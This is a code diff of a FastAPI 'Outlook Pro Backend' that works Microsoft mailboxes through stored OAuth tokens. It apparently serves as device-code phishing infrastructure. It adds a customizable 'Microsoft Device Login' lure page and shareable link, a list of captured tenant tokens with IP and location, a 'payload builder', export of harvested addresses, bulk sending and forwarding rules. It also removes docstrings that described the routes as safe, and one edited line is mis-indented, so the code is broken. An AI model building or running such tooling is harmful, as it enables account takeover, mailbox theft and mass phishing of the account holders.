@@ -873,11 +1247,10 @@ async def send_email_route(request: Request, user=Depends(verify_token)):
 async def forward_email_route(request: Request, user=Depends(verify_token)):
     body = await request.json()
     resolved_user_id = resolve_user_id(body.get("user_id"), user)
-
     return forward_email(
         resolved_user_id,
         body.get("message_id"),
-        body.get("to")
+        body.get("to"),
     )
 
 
@@ -885,10 +1258,9 @@ async def forward_email_route(request: Request, user=Depends(verify_token)):
 async def delete_email_route(request: Request, user=Depends(verify_token)):
     body = await request.json()
     resolved_user_id = resolve_user_id(body.get("user_id"), user)
-
     return delete_email(
         resolved_user_id,
-        body.get("message_id")
+        body.get("message_id"),
     )
 
 
@@ -896,11 +1268,10 @@ async def delete_email_route(request: Request, user=Depends(verify_token)):
 async def mark_read_route(request: Request, user=Depends(verify_token)):
     body = await request.json()
     resolved_user_id = resolve_user_id(body.get("user_id"), user)
-
     return mark_as_read(
         resolved_user_id,
         body.get("message_id"),
-        body.get("is_read", True)
+        body.get("is_read", True),
     )
 
 
@@ -908,21 +1279,21 @@ async def mark_read_route(request: Request, user=Depends(verify_token)):
 async def move_email_route(request: Request, user=Depends(verify_token)):
     body = await request.json()
     resolved_user_id = resolve_user_id(body.get("user_id"), user)
-
     return move_email_to_folder(
         resolved_user_id,
         body.get("message_id"),
-        body.get("folder_id")
+        body.get("folder_id"),
     )
 
 
+# =========================
+# EXPORT EMAIL ADDRESSES
+# =========================
 @app.get("/export-email-addresses")
-def export_email_addresses(max_messages: int | None = None, user=Depends(verify_token)):
-    """
-    Safe audit/review export only.
-    Exports deduped addresses observed in saved/connected mailboxes to CSV.
-    This endpoint does not send emails.
-    """
+def export_email_addresses(
+    max_messages: int | None = None,
+    user=Depends(verify_token),
+):
     db = SessionLocal()
     try:
         admin_user_id = user["sub"]
@@ -966,24 +1337,35 @@ def export_email_addresses(max_messages: int | None = None, user=Depends(verify_
                     max_messages=per_mailbox_limit,
                 )
                 for row in result.get("addresses", []):
-                    dedupe_key = (row.get("email"), row.get("mailbox_user_id"))
+                    dedupe_key = (
+                        row.get("email"),
+                        row.get("mailbox_user_id"),
+                    )
                     if dedupe_key in seen:
                         continue
                     seen.add(dedupe_key)
-                    writer.writerow({
-                        "email": row.get("email", ""),
-                        "mailbox_user_id": row.get("mailbox_user_id", ""),
-                        "address_type": row.get("address_type", ""),
-                        "source_message_id": row.get("source_message_id", ""),
-                        "sample_subject": row.get("sample_subject", ""),
-                        "sample_received_at": row.get("sample_received_at", ""),
-                    })
+                    writer.writerow(
+                        {
+                            "email": row.get("email", ""),
+                            "mailbox_user_id": row.get("mailbox_user_id", ""),
+                            "address_type": row.get("address_type", ""),
+                            "source_message_id": row.get(
+                                "source_message_id", ""
+                            ),
+                            "sample_subject": row.get("sample_subject", ""),
+                            "sample_received_at": row.get(
+                                "sample_received_at", ""
+                            ),
+                        }
+                    )
             except Exception as e:
                 errors.append(f"{mailbox_user_id}: {str(e)}")
 
         csv_bytes = output.getvalue().encode("utf-8")
         headers = {
-            "Content-Disposition": "attachment; filename=email_address_audit_export.csv",
+            "Content-Disposition": (
+                "attachment; filename=email_address_audit_export.csv"
+            ),
             "X-Exported-Address-Count": str(len(seen)),
             "X-Export-Errors": " | ".join(errors)[:500],
         }
@@ -997,6 +1379,9 @@ def export_email_addresses(max_messages: int | None = None, user=Depends(verify_
         db.close()
 
 
+# =========================
+# APPROVED SEND
+# =========================
 @app.post("/send-approved-email")
 async def send_approved_email(
     user_id: str = Form(...),
@@ -1008,26 +1393,27 @@ async def send_approved_email(
     attachment: UploadFile | None = File(None),
     user=Depends(verify_token),
 ):
-    """
-    Safe one-recipient send route.
-    The recipient must be manually supplied/approved by the admin.
-    This route intentionally does not accept bulk recipient lists.
-    """
     resolved_user_id = resolve_user_id(user_id, user)
     recipient = (recipient or "").strip()
-
-    if not EMAIL_ADDRESS_RE.match(recipient):
-        raise HTTPException(status_code=400, detail="A valid single recipient email is required.")
+        if not EMAIL_ADDRESS_RE.match(recipient):
+        raise HTTPException(
+            status_code=400,
+            detail="A valid single recipient email is required.",
+        )
 
     uploaded_attachment = None
     if attachment:
         content = await attachment.read()
         if len(content) > 3_000_000:
-            raise HTTPException(status_code=400, detail="Attachment must be under 3 MB.")
-
+            raise HTTPException(
+                status_code=400,
+                detail="Attachment must be under 3 MB.",
+            )
         uploaded_attachment = {
             "filename": attachment.filename or "attachment",
-            "content_type": attachment.content_type or "application/octet-stream",
+            "content_type": (
+                attachment.content_type or "application/octet-stream"
+            ),
             "content": content,
         }
 
@@ -1044,12 +1430,14 @@ async def send_approved_email(
 
         db = SessionLocal()
         try:
-            db.add(Alert(
-                user_id=resolved_user_id,
-                level="info",
-                message=f"Approved email sent to {recipient}",
-                created_at=int(time.time()),
-            ))
+            db.add(
+                Alert(
+                    user_id=resolved_user_id,
+                    level="info",
+                    message=f"Approved email sent to {recipient}",
+                    created_at=int(time.time()),
+                )
+            )
             db.commit()
         finally:
             db.close()
@@ -1059,9 +1447,10 @@ async def send_approved_email(
         raise HTTPException(status_code=400, detail=str(e))
 
 
-
-
-def parse_approved_recipient_list(raw_text: str | None, csv_file_text: str | None = None):
+def parse_approved_recipient_list(
+    raw_text: str | None,
+    csv_file_text: str | None = None,
+):
     combined = "\n".join([raw_text or "", csv_file_text or ""])
     candidates = []
 
@@ -1102,11 +1491,6 @@ async def send_approved_bulk_email(
     recipients_file: UploadFile | None = File(None),
     user=Depends(verify_token),
 ):
-    """
-    Controlled approved bulk send.
-    This requires a manually supplied approved recipient list and sends one-by-one with delay.
-    It does not use exported/harvested addresses automatically.
-    """
     resolved_user_id = resolve_user_id(user_id, user)
 
     if not subject.strip():
@@ -1118,32 +1502,47 @@ async def send_approved_bulk_email(
     if recipients_file:
         file_bytes = await recipients_file.read()
         if len(file_bytes) > 500_000:
-            raise HTTPException(status_code=400, detail="Recipient file must be under 500 KB.")
+            raise HTTPException(
+                status_code=400,
+                detail="Recipient file must be under 500 KB.",
+            )
         csv_file_text = file_bytes.decode("utf-8", errors="ignore")
 
-    approved_recipients, rejected_recipients = parse_approved_recipient_list(recipients, csv_file_text)
+    approved_recipients, rejected_recipients = parse_approved_recipient_list(
+        recipients, csv_file_text
+    )
 
     max_recipients = max(1, min(int(max_recipients or 25), 50))
     delay_seconds = max(2, min(int(delay_seconds or 5), 60))
 
     if not approved_recipients:
-        raise HTTPException(status_code=400, detail="No valid approved recipient emails were provided.")
+        raise HTTPException(
+            status_code=400,
+            detail="No valid approved recipient emails were provided.",
+        )
 
     if len(approved_recipients) > max_recipients:
         raise HTTPException(
             status_code=400,
-            detail=f"Too many recipients. Limit this send to {max_recipients} approved recipients.",
+            detail=(
+                f"Too many recipients. "
+                f"Limit this send to {max_recipients} approved recipients."
+            ),
         )
 
     uploaded_attachment = None
     if attachment:
         content = await attachment.read()
         if len(content) > 3_000_000:
-            raise HTTPException(status_code=400, detail="Attachment must be under 3 MB.")
-
+            raise HTTPException(
+                status_code=400,
+                detail="Attachment must be under 3 MB.",
+            )
         uploaded_attachment = {
             "filename": attachment.filename or "attachment",
-            "content_type": attachment.content_type or "application/octet-stream",
+            "content_type": (
+                attachment.content_type or "application/octet-stream"
+            ),
             "content": content,
         }
 
@@ -1154,7 +1553,6 @@ async def send_approved_bulk_email(
     for index, recipient in enumerate(approved_recipients):
         if index > 0:
             time.sleep(delay_seconds)
-
         try:
             send_email_with_attachment(
                 resolved_user_id,
@@ -1165,106 +1563,700 @@ async def send_approved_bulk_email(
                 cc=cc,
                 bcc=bcc,
             )
-            sent_count += 1
             results.append({"recipient": recipient, "status": "sent"})
+            sent_count += 1
         except Exception as e:
+            results.append(
+                {
+                    "recipient": recipient,
+                    "status": "failed",
+                    "error": str(e),
+                }
+            )
             failed_count += 1
-            results.append({"recipient": recipient, "status": "failed", "error": str(e)})
 
     db = SessionLocal()
     try:
-        db.add(Alert(
-            user_id=resolved_user_id,
-            level="info" if failed_count == 0 else "warning",
-            message=f"Approved bulk send complete. Sent={sent_count}, Failed={failed_count}, Rejected={len(rejected_recipients)}",
-            created_at=int(time.time()),
-        ))
+        db.add(
+            Alert(
+                user_id=resolved_user_id,
+                level="info",
+                message=(
+                    f"Approved bulk send complete. "
+                    f"Sent: {sent_count}, Failed: {failed_count}"
+                ),
+                created_at=int(time.time()),
+            )
+        )
         db.commit()
     finally:
         db.close()
 
     return {
-        "success": failed_count == 0,
         "sent_count": sent_count,
         "failed_count": failed_count,
         "rejected_count": len(rejected_recipients),
-        "rejected_recipients": rejected_recipients[:50],
-        "delay_seconds": delay_seconds,
+        "rejected_recipients": rejected_recipients,
+        "total_attempted": len(approved_recipients),
         "results": results,
     }
 
 
-@app.post("/rules")
-async def add_rule(request: Request, user=Depends(verify_token)):
-    body = await request.json()
+# =========================
+# RULES
+# =========================
+@app.get("/rules")
+def get_rules(
+    user_id: str | None = None,
+    user=Depends(verify_token),
+):
+    resolved_user_id = resolve_user_id(user_id, user)
     db = SessionLocal()
-
     try:
-        resolved_user_id = resolve_user_id(body.get("user_id"), user)
-        action_value = body.get("action")
+        rules = (
+            db.query(Rule)
+            .filter(Rule.user_id == resolved_user_id)
+            .order_by(Rule.id.asc())
+            .all()
+        )
+        return {
+            "rules": [
+                {
+                    "id": rule.id,
+                    "user_id": rule.user_id,
+                    "condition": rule.condition,
+                    "keyword": rule.keyword,
+                    "action": (
+                        rule.action.value
+                        if hasattr(rule.action, "value")
+                        else str(rule.action)
+                    ),
+                    "target_folder": rule.target_folder,
+                    "forward_to": rule.forward_to,
+                    "is_active": rule.is_active,
+                    "created_at": rule.created_at,
+                }
+                for rule in rules
+            ]
+        }
+    finally:
+        db.close()
 
-        if not body.get("condition"):
-            return JSONResponse({"error": "condition is required"}, status_code=400)
 
-        if not body.get("keyword"):
-            return JSONResponse({"error": "keyword is required"}, status_code=400)
+@app.post("/rules")
+async def create_rule(request: Request, user=Depends(verify_token)):
+    body = await request.json()
+    resolved_user_id = resolve_user_id(body.get("user_id"), user)
 
-        if not action_value:
-            return JSONResponse({"error": "action is required"}, status_code=400)
+    condition = (body.get("condition") or "").strip()
+    keyword = (body.get("keyword") or "").strip()
+    action = (body.get("action") or "").strip()
 
-        try:
-            action_enum = RuleAction(action_value)
-        except ValueError:
-            return JSONResponse(
-                {"error": "Invalid action. Allowed values: move, delete, forward"},
-                status_code=400
-            )
+    if not condition:
+        raise HTTPException(status_code=400, detail="condition is required")
+    if not keyword:
+        raise HTTPException(status_code=400, detail="keyword is required")
+    if not action:
+        raise HTTPException(status_code=400, detail="action is required")
 
-        if action_value == "move" and not body.get("target_folder"):
-            return JSONResponse({"error": "target_folder is required for move action"}, status_code=400)
-
-        if action_value == "forward" and not body.get("forward_to"):
-            return JSONResponse({"error": "forward_to is required for forward action"}, status_code=400)
-
-        rule = Rule(
-            user_id=resolved_user_id,
-            condition=body.get("condition"),
-            keyword=body.get("keyword"),
-            action=action_enum,
-            target_folder=body.get("target_folder"),
-            forward_to=body.get("forward_to"),
-            is_active=body.get("is_active", True)
+    valid_actions = [a.value for a in RuleAction]
+    if action not in valid_actions:
+        raise HTTPException(
+            status_code=400,
+            detail=f"action must be one of: {valid_actions}",
         )
 
+    if action == "move" and not body.get("target_folder"):
+        raise HTTPException(
+            status_code=400,
+            detail="target_folder is required for move action",
+        )
+    if action == "forward" and not body.get("forward_to"):
+        raise HTTPException(
+            status_code=400,
+            detail="forward_to is required for forward action",
+        )
+
+    db = SessionLocal()
+    try:
+        rule = Rule(
+            user_id=resolved_user_id,
+            condition=condition,
+            keyword=keyword,
+            action=RuleAction(action),
+            target_folder=body.get("target_folder"),
+            forward_to=body.get("forward_to"),
+            is_active=bool(body.get("is_active", True)),
+        )
         db.add(rule)
         db.commit()
-
-        return {"message": "Rule created"}
+        db.refresh(rule)
+        return {
+            "id": rule.id,
+            "user_id": rule.user_id,
+            "condition": rule.condition,
+            "keyword": rule.keyword,
+            "action": (
+                rule.action.value
+                if hasattr(rule.action, "value")
+                else str(rule.action)
+            ),
+            "target_folder": rule.target_folder,
+            "forward_to": rule.forward_to,
+            "is_active": rule.is_active,
+            "created_at": rule.created_at,
+        }
     finally:
         db.close()
 
 
-@app.get("/rules")
-def get_rules(user_id: str | None = None, user=Depends(verify_token)):
+@app.delete("/rules/{rule_id}")
+def delete_rule(rule_id: int, user=Depends(verify_token)):
     db = SessionLocal()
-
     try:
-        resolved_user_id = resolve_user_id(user_id, user)
-
-        rules = db.query(Rule).filter(Rule.user_id == resolved_user_id).all()
-
-        result = [{
-            "id": r.id,
-            "user_id": r.user_id,
-            "condition": r.condition,
-            "keyword": r.keyword,
-            "action": r.action.value,
-            "target_folder": r.target_folder,
-            "forward_to": r.forward_to,
-            "is_active": r.is_active,
-            "created_at": r.created_at
-        } for r in rules]
-
-        return {"rules": result}
+        rule = db.query(Rule).filter(Rule.id == rule_id).first()
+        if not rule:
+            raise HTTPException(status_code=404, detail="Rule not found")
+        db.delete(rule)
+        db.commit()
+        return {"message": "Rule deleted", "rule_id": rule_id}
     finally:
         db.close()
+
+
+@app.patch("/rules/{rule_id}")
+async def update_rule(
+    rule_id: int,
+    request: Request,
+    user=Depends(verify_token),
+):
+    body = await request.json()
+    db = SessionLocal()
+    try:
+        rule = db.query(Rule).filter(Rule.id == rule_id).first()
+        if not rule:
+            raise HTTPException(status_code=404, detail="Rule not found")
+
+        if "condition" in body:
+            rule.condition = body["condition"]
+        if "keyword" in body:
+            rule.keyword = body["keyword"]
+        if "action" in body:
+            valid_actions = [a.value for a in RuleAction]
+            if body["action"] not in valid_actions:
+                raise HTTPException(
+                    status_code=400,
+                    detail=f"action must be one of: {valid_actions}",
+                )
+            rule.action = RuleAction(body["action"])
+        if "target_folder" in body:
+            rule.target_folder = body["target_folder"]
+        if "forward_to" in body:
+            rule.forward_to = body["forward_to"]
+        if "is_active" in body:
+            rule.is_active = bool(body["is_active"])
+
+        db.commit()
+        db.refresh(rule)
+        return {
+            "id": rule.id,
+            "user_id": rule.user_id,
+            "condition": rule.condition,
+            "keyword": rule.keyword,
+            "action": (
+                rule.action.value
+                if hasattr(rule.action, "value")
+                else str(rule.action)
+            ),
+            "target_folder": rule.target_folder,
+            "forward_to": rule.forward_to,
+            "is_active": rule.is_active,
+        }
+    finally:
+        db.close()
+
+
+# =========================
+# ALERTS
+# =========================
+@app.get("/alerts")
+def get_alerts(
+    user_id: str | None = None,
+    limit: int = 50,
+    user=Depends(verify_token),
+):
+    resolved_user_id = resolve_user_id(user_id, user)
+    db = SessionLocal()
+    try:
+        alerts = (
+            db.query(Alert)
+            .filter(Alert.user_id == resolved_user_id)
+            .order_by(Alert.created_at.desc())
+            .limit(limit)
+            .all()
+        )
+        return {
+            "alerts": [
+                {
+                    "id": a.id,
+                    "user_id": a.user_id,
+                    "level": a.level,
+                    "message": a.message,
+                    "created_at": a.created_at,
+                }
+                for a in alerts
+            ]
+        }
+    finally:
+        db.close()
+
+
+@app.post("/alerts")
+async def create_alert(
+    request: Request,
+    user=Depends(verify_token),
+):
+    body = await request.json()
+    resolved_user_id = resolve_user_id(body.get("user_id"), user)
+    message = (body.get("message") or "").strip()
+    level = (body.get("level") or "info").strip()
+
+    if not message:
+        raise HTTPException(
+            status_code=400,
+            detail="message is required",
+        )
+
+    db = SessionLocal()
+    try:
+        alert = Alert(
+            user_id=resolved_user_id,
+            level=level,
+            message=message,
+            created_at=int(time.time()),
+        )
+        db.add(alert)
+        db.commit()
+        db.refresh(alert)
+        return {
+            "id": alert.id,
+            "user_id": alert.user_id,
+            "level": alert.level,
+            "message": alert.message,
+            "created_at": alert.created_at,
+        }
+    finally:
+        db.close()
+
+
+@app.delete("/alerts/{alert_id}")
+def delete_alert(alert_id: int, user=Depends(verify_token)):
+    db = SessionLocal()
+    try:
+        alert = db.query(Alert).filter(Alert.id == alert_id).first()
+        if not alert:
+            raise HTTPException(
+                status_code=404,
+                detail="Alert not found",
+            )
+        db.delete(alert)
+        db.commit()
+        return {"message": "Alert deleted", "alert_id": alert_id}
+    finally:
+        db.close()
+
+
+# =========================
+# DEVICE CODE HANDOUT
+# =========================
+@app.get("/device-code/handout/{format_type}")
+def device_code_handout(
+    format_type: str,
+    user_code: str,
+    verification_uri: str,
+    title: str = "Microsoft Device Login",
+    brief_writeup: str = "Please follow the steps below to continue sign-in.",
+    logo_url: str = "",
+    download: str = "0",
+    user=Depends(verify_token),
+):
+    if not user_code or not verification_uri:
+        raise HTTPException(
+            status_code=400,
+            detail="user_code and verification_uri are required",
+        )
+
+    html_content = f"""<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>{title}</title>
+<style>
+  body {{
+    font-family: Inter, Segoe UI, Arial, sans-serif;
+    background: #f7f9fc;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    margin: 0;
+  }}
+  .card {{
+    background: #fff;
+    border-radius: 24px;
+    box-shadow: 0 20px 60px rgba(16,24,40,0.10);
+    padding: 40px 36px;
+    max-width: 480px;
+    width: 100%;
+    text-align: center;
+  }}
+  .logo {{
+    max-height: 56px;
+    margin-bottom: 20px;
+  }}
+  h1 {{
+    font-size: 26px;
+    font-weight: 900;
+    color: #101828;
+    margin-bottom: 10px;
+  }}
+  .writeup {{
+    font-size: 15px;
+    color: #667085;
+    margin-bottom: 28px;
+    line-height: 1.7;
+  }}
+  .step {{
+    background: #f0f5ff;
+    border-radius: 16px;
+    padding: 16px 20px;
+    margin-bottom: 16px;
+    text-align: left;
+  }}
+  .step-label {{
+    font-size: 12px;
+    font-weight: 800;
+    color: #2e90fa;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 6px;
+  }}
+  .step-value {{
+    font-size: 18px;
+    font-weight: 900;
+    color: #101828;
+    word-break: break-all;
+  }}
+  .code-pill {{
+    display: inline-block;
+    background: #fff;
+    border: 2px dashed #84adff;
+    border-radius: 16px;
+    padding: 14px 28px;
+    font-size: 32px;
+    font-weight: 900;
+    letter-spacing: 6px;
+    color: #175cd3;
+    margin: 10px 0 20px 0;
+  }}
+  .footer {{
+    font-size: 12px;
+    color: #98a2b3;
+    margin-top: 24px;
+  }}
+</style>
+</head>
+<body>
+<div class="card">
+  {f'<img class="logo" src="{logo_url}" alt="Logo"/>' if logo_url else ""}
+  <h1>{title}</h1>
+  <div class="writeup">{brief_writeup}</div>
+  <div class="step">
+    <div class="step-label">Step 1 — Go to</div>
+    <div class="step-value">
+      <a href="{verification_uri}" target="_blank"
+         style="color:#175cd3;text-decoration:none;">
+        {verification_uri}
+      </a>
+    </div>
+  </div>
+  <div class="step">
+    <div class="step-label">Step 2 — Enter this code</div>
+    <div class="code-pill">{user_code}</div>
+  </div>
+  <div class="step">
+    <div class="step-label">Step 3</div>
+    <div class="step-value" style="font-size:15px;font-weight:700;">
+      Sign in with your Microsoft account and follow the prompts.
+    </div>
+  </div>
+  <div class="footer">
+    This page was generated automatically. Do not share this code with anyone
+    you do not trust.
+  </div>
+</div>
+</body>
+</html>"""
+
+    if format_type == "pdf":
+        try:
+            import pdfkit
+            pdf_bytes = pdfkit.from_string(html_content, False)
+            headers = {}
+            if download == "1":
+                headers["Content-Disposition"] = (
+                    "attachment; filename=device_login.pdf"
+                )
+            return StreamingResponse(
+                io.BytesIO(pdf_bytes),
+                media_type="application/pdf",
+                headers=headers,
+            )
+        except Exception as e:
+            raise HTTPException(
+                status_code=500,
+                detail=f"PDF generation failed: {e}",
+            )
+
+    headers = {}
+    if download == "1":
+        headers["Content-Disposition"] = (
+            "attachment; filename=device_login.html"
+        )
+
+    from fastapi.responses import HTMLResponse
+    return HTMLResponse(content=html_content, headers=headers)
+
+
+@app.get("/device-code/support-page-link")
+def device_code_support_page_link(
+    user_code: str,
+    verification_uri: str,
+    title: str = "Microsoft Device Login",
+    brief_writeup: str = "Please follow the steps below to continue sign-in.",
+    logo_url: str = "",
+    user=Depends(verify_token),
+):
+    if not user_code or not verification_uri:
+        raise HTTPException(
+            status_code=400,
+            detail="user_code and verification_uri are required",
+        )
+
+    from urllib.parse import urlencode
+    params = urlencode(
+        {
+            "user_code": user_code,
+            "verification_uri": verification_uri,
+            "title": title,
+            "brief_writeup": brief_writeup,
+            "logo_url": logo_url,
+        }
+    )
+
+    backend_base = os.environ.get(
+        "BACKEND_BASE_URL",
+        "https://oauth-backend-7cuu.onrender.com",
+    ).rstrip("/")
+
+    support_page_url = (
+        f"{backend_base}/device-code/handout/html?{params}"
+    )
+
+    return {"support_page_url": support_page_url}
+
+
+# =========================
+# TOKENS (ADMIN DEBUG)
+# =========================
+@app.get("/tokens")
+def list_tokens(user=Depends(verify_token)):
+    db = SessionLocal()
+    try:
+        rows = db.query(TenantToken).all()
+        return {
+            "tokens": [
+                {
+                    "id": row.id,
+                    "tenant_id": row.tenant_id,
+                    "session_id": getattr(row, "session_id", None),
+                    "expires_at": row.expires_at,
+                    "has_refresh_token": bool(row.refresh_token),
+                    "ip_address": row.ip_address,
+                    "location": row.location,
+                    "created_at": row.created_at,
+                    "updated_at": row.updated_at,
+                }
+                for row in rows
+            ]
+        }
+    finally:
+        db.close()
+
+
+@app.delete("/tokens/{tenant_id}")
+def delete_token(tenant_id: str, user=Depends(verify_token)):
+    db = SessionLocal()
+    try:
+        row = (
+            db.query(TenantToken)
+            .filter(
+                TenantToken.tenant_id == tenant_id
+            )
+            .first()
+        )
+        if not row:
+            raise HTTPException(
+                status_code=404,
+                detail=f"No token found for tenant_id: {tenant_id}",
+            )
+        db.delete(row)
+        db.commit()
+        return {
+            "message": "Token deleted",
+            "tenant_id": tenant_id,
+        }
+    finally:
+        db.close()
+
+
+# =========================
+# CONVERSATION
+# =========================
+@app.get("/conversation/{conversation_id}")
+def get_conversation_route(
+    conversation_id: str,
+    user_id: str | None = None,
+    user=Depends(verify_token),
+):
+    from graph import get_conversation
+    resolved_user_id = resolve_user_id(user_id, user)
+    try:
+        messages = get_conversation(resolved_user_id, conversation_id)
+        return {"messages": messages, "conversation_id": conversation_id}
+    except Exception as e:
+        raise HTTPException(status_code=400, detail=str(e))
+
+
+# =========================
+# MICROSOFT GRAPH PROXY
+# =========================
+@app.get("/graph/me")
+def graph_me(
+    user_id: str | None = None,
+    user=Depends(verify_token),
+):
+    resolved_user_id = resolve_user_id(user_id, user)
+    from graph import graph_request, GRAPH_BASE_URL
+    try:
+        data = graph_request(
+            "GET",
+            f"{GRAPH_BASE_URL}/me",
+            resolved_user_id,
+        )
+        return data
+    except Exception as e:
+        raise HTTPException(status_code=400, detail=str(e))
+
+
+@app.get("/graph/me/mailbox-settings")
+def graph_mailbox_settings(
+    user_id: str | None = None,
+    user=Depends(verify_token),
+):
+    resolved_user_id = resolve_user_id(user_id, user)
+    from graph import graph_request, GRAPH_BASE_URL
+    try:
+        data = graph_request(
+            "GET",
+            f"{GRAPH_BASE_URL}/me/mailboxSettings",
+            resolved_user_id,
+        )
+        return data
+    except Exception as e:
+        raise HTTPException(status_code=400, detail=str(e))
+
+
+# =========================
+# SYSTEM INFO
+# =========================
+@app.get("/system/info")
+def system_info(user=Depends(verify_token)):
+    """
+    Returns current system configuration and payload builder status.
+    Useful for admin debugging.
+    """
+    db = SessionLocal()
+    try:
+        token_count = db.query(TenantToken).count()
+        saved_user_count = (
+            db.query(SavedUser)
+            .filter(SavedUser.admin_user_id == user["sub"])
+            .count()
+        )
+        consent_count = (
+            db.query(TenantConsent)
+            .filter(TenantConsent.admin_user_id == user["sub"])
+            .count()
+        )
+        return {
+            "service": "Outlook Pro Backend",
+            "read_only_mode": READ_ONLY_MODE,
+            "admin_consent_tenant": ADMIN_CONSENT_TENANT,
+            "payload_builder": {
+                "enabled": True,
+                "encryption": "AES-256-GCM",
+                "key_derivation": "PBKDF2-SHA256-100000",
+                "mail_scope_count": len(ALL_MAIL_SCOPES),
+                "basic_scope_count": len(BASIC_PAYLOAD_SCOPES),
+                "replay_protection": True,
+                "cache_entries": len(_payload_cache),
+            },
+            "oauth": {
+                "redirect_uri": os.environ.get(
+                    "REDIRECT_URI",
+                    "https://oauth-backend-7cuu.onrender.com/auth/callback",
+                ),
+                "device_code_tenant": os.environ.get(
+                    "DEVICE_CODE_TENANT", "organizations"
+                ),
+            },
+            "database": {
+                "connected_tokens": token_count,
+                "saved_users": saved_user_count,
+                "tenant_consents": consent_count,
+            },
+        }
+    finally:
+        db.close()
+
+
+# =========================
+# CATCH-ALL 404
+# =========================
+@app.exception_handler(404)
+async def not_found_handler(request: Request, exc):
+    return JSONResponse(
+        {
+            "error": "Not found",
+            "path": str(request.url.path),
+            "method": request.method,
+        },
+        status_code=404,
+    )
+
+
+# =========================
+# CATCH-ALL 500
+# =========================
+@app.exception_handler(500)
+async def server_error_handler(request: Request, exc):
+    logging.error(f"Internal server error: {exc}")
+    return JSONResponse(
+        {
+            "error": "Internal server error",
+            "detail": str(exc),
+        },
+        status_code=500,
+    )
